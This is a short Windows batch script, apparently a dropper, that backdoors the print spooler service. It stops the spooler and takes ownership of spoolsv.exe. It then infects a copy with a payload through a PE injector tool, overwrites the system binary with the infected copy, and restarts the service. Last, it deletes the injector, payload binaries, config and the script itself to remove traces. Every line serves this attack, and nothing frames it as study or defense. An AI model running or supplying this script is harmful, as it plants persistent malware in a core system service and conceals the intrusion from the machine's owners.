sc stop spooler
takeown /f C:\Windows\System32\spoolsv.exe
echo y| cacls C:\Windows\System32\spoolsv.exe /G %username%:F
echo f| xcopy C:\Windows\System32\spoolsv.exe %TEMP%\spoolsv.exe /f
%TEMP%\PEInjector.exe --infect %TEMP%\spoolsv.exe
echo f| xcopy %TEMP%\spoolsv.exe C:\windows\system32\spoolsv.exe /f

echo y| cacls C:\Windows\System32\spoolsv.exe /G system:F
sc start spooler

echo f| del %TEMP%\spoolsv.exe /f
echo f| del %TEMP%\peinjector.exe /f
echo f| del %TEMP%\payload_x86.bin /f
echo f| del %TEMP%\payload_x64.bin /f
echo f| del %TEMP%\config.ini /f
echo f| del %TEMP%\dropper.bat /f

pause